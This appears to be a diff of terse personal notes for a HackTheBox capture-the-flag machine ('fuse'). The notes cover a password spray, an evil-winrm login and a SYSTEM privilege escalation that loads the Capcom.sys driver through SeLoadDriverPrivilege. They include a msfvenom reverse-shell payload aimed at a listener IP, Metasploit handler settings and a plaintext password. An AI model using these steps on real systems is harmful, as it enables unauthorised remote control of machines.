@@ -12,4 +12,20 @@
 - got pass $fab@s3Rv1ce$1
 - hit smb with medusa using the all_users.txt and got pass $fab@s3Rv1ce$1
 - evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb
-- 
+- Got user
+- found that svc-print has a SeLoadDriverPrivilege priv
+- can abuse by loading malicious driver
+- need to plant malicious driver and then execute its exploit to create system shell
+- create payload using msfvenom -p windows/shell/reverse_tcp LHOST=10.10.15.51 LPORT=4444 -o exe > shell.exe
+- compile exploitcapcom from github in visual studio 2019 after pointing cmd spawning line to payload shell.exe in C:\Users\svc-print\Documents\toship\shell.exe
+    in  new tab in msfconsole,
+        use exploit/multi/handler
+        set payload windows/shell/reverse_tcp
+        set lhost=10.10.15.51
+        set lport=4444
+        run
+- back in winrm upload toship.zip
+- Expand-Archive -LiteralPath ./toship.zip -DestinationPath .
+- cd toship
+- ./EOPLOADDRIVER Myserve C:\Users\svc-print\Documents\toship\Capcom.sys
+- ./ExploitCapcom.exe
